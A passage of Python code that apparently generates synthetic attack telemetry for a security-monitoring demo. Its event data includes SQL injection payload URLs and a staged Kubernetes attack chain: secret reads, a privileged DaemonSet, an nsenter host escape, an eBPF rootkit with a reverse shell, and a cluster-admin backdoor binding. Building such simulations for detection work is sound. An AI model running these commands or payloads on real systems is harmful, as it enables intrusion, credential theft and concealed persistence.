            trace_id=attack_trace,
            span_id=stage["span"],
            parent_span_id=stage["parent"],
            span_name=f"security.attack.{stage['stage']}",
            span_attributes=f"attack.id=attack-octo-demo-001 mitre={stage['technique_id']}",
            error_type=stage["type"] if stage["level"] == "ERROR" else None,
            slow_request=stage["level"] == "ERROR",
            workflow_id="admin-threat-simulation",
            workflow_step=stage["stage"],
            request_id=attack_request_id,
            run_id=attack_run_id,
            hostname=stage["host"],
            offset=offset,
        )
        events.append({
            **base_event,
            "security.attack.id": "attack-octo-demo-001",
            "security.attack.stage": stage["stage"],
            "security.attack.type": stage["type"],
            "security.attack.detected": True,
            "security.severity": stage["severity"],
            "mitre.tactic": stage["tactic"],
            "mitre.technique_id": stage["technique_id"],
            "mitre.technique": stage["technique"],
            "attack.entry_point": stage["url"],
            "attack.lotl_binary": stage["lotl"],
            "source.ip": attack_source_ip,
            "server.address": stage["host"],
            "destination.ip": stage["destination_ip"],
            "destination.port": stage["destination_port"],
            "network.protocol.name": "https" if stage["destination_port"] == 443 else "http",
            "osquery.query": stage["osquery_query"],
            "osquery.finding": stage["osquery_finding"],
            "osquery.sql": "SELECT pid, name, path, cmdline FROM processes WHERE start_time > strftime('%s','now','-30 minutes');",
            "osquery.result_count": 1,
            "cloud.instance.id": stage["instance"],
            "host.name": stage["host"],
            "host.role": stage["role"],
            "vm.compromised": stage["compromised"],
            **{key: value for key, value in stage.items() if "." in key},
        })

    login_trace = "trace_octo_apm_login_001"
    login_root_span = "span_octo_login_root"
    events.extend([
        application_event(
            "octo-apm-demo",
            message="login request completed",
            url="/octo/login",
            http_method="POST",
            status_code="401",
            response_time_ms=640,
            client_ip=brute_force_ip,
            user_agent="Mozilla/5.0 (compatible; Hydra/9.0)",
            user="octo-admin",
            trace_id=login_trace,
            span_id=login_root_span,
            span_name="HTTP POST /octo/login",
            span_attributes="auth.result=failed mfa.required=true",
            attack_type="broken_auth",
            attack_severity="high",
            workflow_id="auth",
            workflow_step="login",
            metric_name="http.server.requests",
            metric_value="1",
            metric_unit="count",
            hostname="octo-apm-demo-frontend-01",
            offset=105,
        ),
        application_event(
            "octo-apm-demo",
            message="credential lookup span completed",
            url="/octo/internal/auth/credentials",
            http_method="POST",
            status_code="200",
            response_time_ms=390,
            client_ip=brute_force_ip,
            user="octo-admin",
            trace_id=login_trace,
            span_id="span_octo_auth_db_lookup",
            parent_span_id=login_root_span,
            span_name="SELECT users by username",
            span_attributes="db.statement=select users username=octo-admin",
            db_target="oracle_atp",
            db_statement="select id, password_hash from users where username = :username",
            db_elapsed_ms=390,
            workflow_id="auth",
            workflow_step="credentials",
            metric_name="apm.db.duration",
            metric_value="390",
            metric_unit="ms",
            hostname="octo-apm-demo-db-client-01",
            offset=106,
        ),
        application_event(
            "octo-apm-demo",
            message="APM metric sample p95 latency",
            url="/octo/metrics",
            status_code="200",
            response_time_ms=20,
            trace_id="trace_octo_apm_metric_001",
            span_id="span_octo_metric_p95",
            span_kind="METRIC",
            span_name="metric http.server.duration.p95",
            span_attributes="metric.window=5m route=/octo/checkout",
            workflow_id="observability",
            workflow_step="metrics",
            metric_name="http.server.duration.p95",
            metric_value="2860",
            metric_unit="ms",
            hostname="octo-apm-demo-metrics-01",
            offset=107,
        ),
        application_event(
            "octo-apm-demo",
            message="APM metric sample error count",
            url="/octo/metrics",
            status_code="200",
            response_time_ms=18,
            trace_id="trace_octo_apm_metric_002",
            span_id="span_octo_metric_errors",
            span_kind="METRIC",
            span_name="metric apm.service.errors",
            span_attributes="metric.window=5m route=/octo/checkout",
            workflow_id="observability",
            workflow_step="metrics",
            metric_name="apm.service.errors",
            metric_value="1",
            metric_unit="count",
            hostname="octo-apm-demo-metrics-01",
            offset=108,
        ),
    ])

    # ═══════════════════════════════════════════════════════════════
    #  APM SQL Injection Attack in Request (T1190) — SOC Application Logs
    # ═══════════════════════════════════════════════════════════════
    apm_sqli_payloads = [
        ("enterprise-crm-portal", "/crm/api/customers?search=1' OR 1=1--", "401", 41),
        ("enterprise-crm-portal", "/crm/api/customers?search=' OR '1'='1", "401", 45),
        ("enterprise-crm-portal", "/crm/api/orders?status=pending' UNION SELECT username,password,1,2,3,4,5 FROM users--", "500", 320),
        ("octo-drone-shop", "/shop/api/products?cat=1 UNION%20SELECT%20password,email%20FROM%20customers--", "500", 280),
        ("octo-drone-shop", "/shop/api/products?id=2'%20OR%201%3D1--", "200", 95),
        ("enterprise-crm-portal", "/crm/api/reports?id=1' AND SLEEP(5)--", "504", 5050),
        ("enterprise-crm-portal", "/crm/api/reports?id=1' OR (SELECT COUNT(*) FROM users)>0--", "200", 130),
        ("octo-drone-shop", "/shop/search?q=' UNION SELECT NULL,table_name FROM INFORMATION_SCHEMA.TABLES--", "500", 410),
        ("enterprise-crm-portal", "/crm/login?user=admin'--&pass=anything", "302", 80),
        ("octo-drone-shop", "/shop/api/orders?ref=1; DROP TABLE sessions", "500", 65),
        ("enterprise-crm-portal", "/crm/api/customers?filter=' OR 1=1 LIMIT 1 OFFSET 0--", "200", 110),
        ("octo-drone-shop", "/shop/api/products?id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--", "500", 240),
    ]
    for i, (svc, url, status, latency) in enumerate(apm_sqli_payloads):
        events.append(application_event(
            svc,
            message="SQL injection attack detected in request",
            level="WARN" if status.startswith("2") else "ERROR",
            url=url,
            http_method="GET",
            status_code=status,
            response_time_ms=latency,
            client_ip=random.choice(SUSPICIOUS_IPS),
            user_agent=random.choice(["sqlmap/1.7", "Mozilla/5.0 (compatible; Nuclei)", "Mozilla/5.0 (X11; Linux x86_64)"]),
            attack_type="sql_injection",
            attack_severity="critical",
            waf_score=92 + (i % 8),
            span_attributes=f"attack.type=sql_injection mitre.technique=T1190 owasp.category=A03_Injection attack.payload_len={len(url)}",
            workflow_id="threat-detection",
            workflow_step="apm-sqli",
            trace_id=f"trace_apm_sqli_{i:02d}",
            offset=150 + i,
        ))

    events.extend(generate_oke_kubernetes_attack_events())

    return events


def generate_oke_kubernetes_attack_events():
    """Generate OKE/Kubernetes attack telemetry in the SOC Application/APM schema."""
    attack_trace = "trace_oke_boopkit_attack_001"
    attack_id = "attack-oke-boopkit-001"
    run_id = "run-oke-k8s-attacks-001"
    request_id = "req_oke_boopkit_001"
    actor_ip = "198.51.100.88"
    stages = [
        {
            "stage": "api_recon",
            "message": "OKE API discovery requested cluster resources with kubectl",
            "severity": "medium",
            "technique_id": "T1613",
            "technique": "Container and Resource Discovery",
            "url": "/apis/apps/v1/namespaces/prod/deployments",
            "method": "GET",
            "status": "200",
            "span": "span_oke_boopkit_api_recon",
            "parent": "",
            "host": "oke-api-server",
            "workflow_step": "api-recon",
            "command": "kubectl get pods,secrets,daemonsets -A",
            "attributes": "k8s.audit.verb=list k8s.resource=pods,secrets userAgent=kubectl",
        },
        {
            "stage": "secret_collection",
            "message": "Service account token and registry secret read from production namespace",
            "severity": "high",
            "technique_id": "T1552.007",
            "technique": "Container and Cloud Credential Discovery",
            "url": "/api/v1/namespaces/prod/secrets/prod-registry-token",
            "method": "GET",
            "status": "200",
            "span": "span_oke_boopkit_secret_read",
            "parent": "span_oke_boopkit_api_recon",
            "host": "oke-api-server",
            "workflow_step": "secret-collection",
            "command": "kubectl get secret prod-registry-token -n prod -o yaml",
            "attributes": "k8s.audit.verb=get k8s.resource=secrets k8s.namespace=prod",
        },
        {
            "stage": "privileged_daemonset",
            "message": "Privileged DaemonSet created with hostPID and hostPath mounts",
            "severity": "critical",
            "technique_id": "T1611",
            "technique": "Escape to Host",
            "url": "/apis/apps/v1/namespaces/kube-system/daemonsets/node-diag-agent",
            "method": "POST",
            "status": "201",
            "span": "span_oke_boopkit_privileged_daemonset",
            "parent": "span_oke_boopkit_secret_read",
            "host": "oke-api-server",
            "workflow_step": "privileged-workload",
            "command": "kubectl apply -f daemonset-hostpid-hostpath.yaml",
            "attributes": "k8s.audit.verb=create k8s.resource=daemonsets privileged=true hostPID=true hostPath=/proc,/sys,/var/run",
        },
        {
            "stage": "node_exec",
            "message": "Interactive exec opened into privileged OKE node diagnostic pod",
            "severity": "high",
            "technique_id": "T1609",
            "technique": "Container Administration Command",
            "url": "/api/v1/namespaces/kube-system/pods/node-diag-agent-8fk2p/exec",
            "method": "POST",
            "status": "101",
            "span": "span_oke_boopkit_pod_exec",
            "parent": "span_oke_boopkit_privileged_daemonset",
            "host": "oke-worker-01",
            "workflow_step": "pod-exec",
            "command": "kubectl exec -n kube-system node-diag-agent-8fk2p -- nsenter -t 1 -m -u -i -n sh",
            "attributes": "k8s.audit.verb=create subresource=exec container=node-diag-agent nsenter host namespace",
        },
        {
            "stage": "boopkit_ebpf_load",
            "message": "Boopkit-style eBPF program load observed from privileged container",
            "severity": "critical",
            "technique_id": "T1014",
            "technique": "Rootkit",
            "url": "/proc/sys/kernel/bpf",
            "method": "POST",
            "status": "500",
            "span": "span_oke_boopkit_ebpf_load",
            "parent": "span_oke_boopkit_pod_exec",
            "host": "oke-worker-01",
            "workflow_step": "ebpf-rootkit",
            "command": "bpftool prog load boopkit_kern.o /sys/fs/bpf/boopkit type kprobe",
            "attributes": "boopkit ebpf rootkit bpftool kprobe /sys/fs/bpf traffic-hiding",
        },
        {
            "stage": "boopkit_c2_hide",
            "message": "Boopkit eBPF rootkit hid reverse shell and C2 listener traffic",
            "severity": "critical",
            "technique_id": "T1105",
            "technique": "Ingress Tool Transfer",
            "url": "/run/boopkit/c2",
            "method": "POST",
            "status": "503",
            "span": "span_oke_boopkit_c2_hide",
            "parent": "span_oke_boopkit_ebpf_load",
            "host": "oke-worker-01",
            "workflow_step": "c2-traffic-hide",
            "command": "boopkit --hide-port 443 --reverse-shell /bin/sh",
            "attributes": "boopkit reverse-shell hidden-port ebpf traffic hide",
        },
        {
            "stage": "cronjob_persistence",
            "message": "Kubernetes CronJob persistence created to relaunch node diagnostic payload",
            "severity": "high",
            "technique_id": "T1053.007",
            "technique": "Scheduled Task/Job: Container and Orchestration Job",
            "url": "/apis/batch/v1/namespaces/kube-system/cronjobs/node-diag-refresh",
            "method": "POST",
            "status": "201",
            "span": "span_oke_boopkit_cronjob_persistence",
            "parent": "span_oke_boopkit_c2_hide",
            "host": "oke-api-server",
            "workflow_step": "persistence",
            "command": "kubectl create cronjob node-diag-refresh --image=registry.example.test/node-diag:latest",
            "attributes": "k8s.audit.verb=create k8s.resource=cronjobs persistence daemonset relaunch",
        },
        {
            "stage": "rbac_backdoor",
            "message": "ClusterRoleBinding granted cluster-admin to workload service account",
            "severity": "critical",
            "technique_id": "T1098",
            "technique": "Account Manipulation",
            "url": "/apis/rbac.authorization.k8s.io/v1/clusterrolebindings/node-diag-admin",
            "method": "POST",
            "status": "201",
            "span": "span_oke_boopkit_rbac_backdoor",
            "parent": "span_oke_boopkit_cronjob_persistence",
            "host": "oke-api-server",
            "workflow_step": "rbac-backdoor",
            "command": "kubectl create clusterrolebinding node-diag-admin --clusterrole=cluster-admin --serviceaccount=kube-system:node-diag-agent",
            "attributes": "k8s.audit.verb=create k8s.resource=clusterrolebindings cluster-admin serviceaccount backdoor",
        },
    ]

    events = []
    for offset, stage in enumerate(stages, start=112):
        base_event = application_event(
            "octo-apm-demo",
            message=stage["message"],
            level="ERROR" if stage["severity"] in {"critical", "high"} else "WARN",
            url=stage["url"],
            http_method=stage["method"],
            status_code=stage["status"],
            response_time_ms=640 + (offset - 112) * 180,
            client_ip=actor_ip,
            user_agent="kubectl/v1.29 oci-oke-demo",
            user="system:serviceaccount:kube-system:node-diag-agent",
            trace_id=attack_trace,
            span_id=stage["span"],
            parent_span_id=stage["parent"],
            span_name=f"oke.attack.{stage['stage']}",
            span_attributes=stage["attributes"],
            error_type=stage["stage"] if stage["severity"] in {"critical", "high"} else None,
            slow_request=stage["severity"] == "critical",
            workflow_id="oke-kubernetes-attack-simulation",
            workflow_step=stage["workflow_step"],
            request_id=request_id,
            run_id=run_id,
            hostname=stage["host"],
            metric_name="oke.security.attack.event",
            metric_value="1",
            metric_unit="count",
            offset=offset,
        )
        events.append({
            **base_event,
            "security.attack.id": attack_id,
            "security.attack.stage": stage["stage"],
            "security.attack.type": "oke_kubernetes_attack",
            "security.attack.detected": True,
            "security.severity": stage["severity"],
            "mitre.tactic": "Defense Evasion" if "boopkit" in stage["stage"] else "Privilege Escalation",
            "mitre.technique_id": stage["technique_id"],
            "mitre.technique": stage["technique"],
            "source.ip": actor_ip,
            "host.name": stage["host"],
            "host.role": "oke-control-plane" if stage["host"] == "oke-api-server" else "oke-worker",
            "process.command_line": stage["command"],
            "kubernetes.cluster.name": "oke-demo-cluster",
            "kubernetes.namespace": "kube-system" if "kube-system" in stage["url"] else "prod",
            "kubernetes.audit.verb": "create" if stage["method"] == "POST" else "get",
            "kubernetes.audit.uri": stage["url"],
        })
    return events
